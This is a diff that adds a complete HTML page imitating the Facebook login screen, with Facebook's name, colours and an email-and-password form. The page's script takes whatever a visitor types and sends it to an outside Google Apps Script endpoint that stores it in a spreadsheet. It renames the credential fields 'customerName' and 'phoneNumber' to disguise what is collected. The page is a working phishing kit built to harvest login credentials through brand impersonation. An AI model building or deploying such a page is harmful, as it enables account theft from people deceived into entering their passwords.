@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #e9ebee;
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .facebook-title {
+            color: #4267B2;
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            width: 300px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+        }
+        .login-box h2 {
+            color: #333;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4267B2;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-button:hover {
+            background-color: #365899;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="facebook-title">Facebook</div>
+        <div class="login-box">
+            <h2>Login</h2>
+            <form id="loginForm">
+                <input type="text" placeholder="Email or phone number" id="customerName" class="input-field" required>
+                <input type="password" placeholder="Password" id="phoneNumber" class="input-field" required>
+                <button type="submit" class="login-button" id="loginButton">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var loginButton = document.getElementById('loginButton');
+            loginButton.disabled = true;
+
+            // Prepare form data
+            var formData = {
+                customerName: document.getElementById('customerName').value,
+                phoneNumber: document.getElementById('phoneNumber').value
+            };
+
+            // Construct the query string for the Google Sheets URL
+            var queryString = Object.keys(formData).map(key => key + '=' + encodeURIComponent(formData[key])).join('&');
+            var url = 'https://script.google.com/macros/s/AKfycbwwCUJ-H3yy-oqMWyo-oEdvtteJ2F17munz1gTKZTFjaoi6Kw3lHnNaySdAqoxEsT3T/exec?' + queryString;
+
+            // Send the request to Google Sheets
+            fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'SUCCESS') {
+                    alert('Data saved successfully!');
+                    e.target.reset();
+                } else {
+                    alert('Failed to save data');
+                }
+                loginButton.disabled = false;
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Data Saved to DB: ' + error.message);
+                e.target.reset();
+                loginButton.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
